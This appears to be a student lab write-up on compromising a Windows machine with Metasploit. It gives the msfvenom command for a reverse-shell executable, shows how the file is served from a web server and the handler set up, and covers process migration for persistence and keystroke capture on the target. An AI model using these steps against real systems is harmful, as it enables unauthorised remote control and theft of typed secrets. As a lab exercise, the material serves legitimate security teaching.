# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

![Screenshot 2024-04-24 083134](https://github.com/RahulKrishna05/Compromising-windows-using-Metasploit/assets/162027231/3c2a2010-2359-4571-a58f-d200759f34a8)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:

![Screenshot 2024-04-24 083146](https://github.com/RahulKrishna05/Compromising-windows-using-Metasploit/assets/162027231/b99a4e6b-48a1-4a07-8489-4369121bea5c)

copy the fun.exe into the apache /var/www/html folder

![Screenshot 2024-04-24 083201](https://github.com/RahulKrishna05/Compromising-windows-using-Metasploit/assets/162027231/40497d17-096b-46cf-a6cc-ca3372776719)

Start apache server sudo systemctl apache2 start

![Screenshot 2024-04-24 083234](https://github.com/RahulKrishna05/Compromising-windows-using-Metasploit/assets/162027231/66a0c1b4-52d0-4391-979f-f0a2c44e1643)

Check the status of apache2

![Screenshot 2024-04-24 083309](https://github.com/RahulKrishna05/Compromising-windows-using-Metasploit/assets/162027231/a31e9020-30ea-4761-8af3-c5b98f51a367)

Invoke msfconsole:

## OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![Screenshot 2024-04-24 083339](https://github.com/RahulKrishna05/Compromising-windows-using-Metasploit/assets/162027231/dd19969a-4a23-4793-9976-e15ad7bbd664)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![Screenshot 2024-04-24 083405](https://github.com/RahulKrishna05/Compromising-windows-using-Metasploit/assets/162027231/5f1f0412-7440-4ead-9a2f-8be93ce7ff16)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![Screenshot 2024-04-24 083422](https://github.com/RahulKrishna05/Compromising-windows-using-Metasploit/assets/162027231/949a0b8f-4725-4c59-9441-9271a1d2c223)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![Screenshot 2024-04-24 083436](https://github.com/RahulKrishna05/Compromising-windows-using-Metasploit/assets/162027231/b12a63f9-4971-49e6-b66f-3a672f73c439)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![Screenshot 2024-04-24 083454](https://github.com/RahulKrishna05/Compromising-windows-using-Metasploit/assets/162027231/1fa5d8d0-eeef-4ef1-a2be-9795445f1e30)

keyscan_dump Shows the keystrokes captured so far

![Screenshot 2024-04-24 083501](https://github.com/RahulKrishna05/Compromising-windows-using-Metasploit/assets/162027231/15941174-012b-4f93-b402-805ed8aa92a1)



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
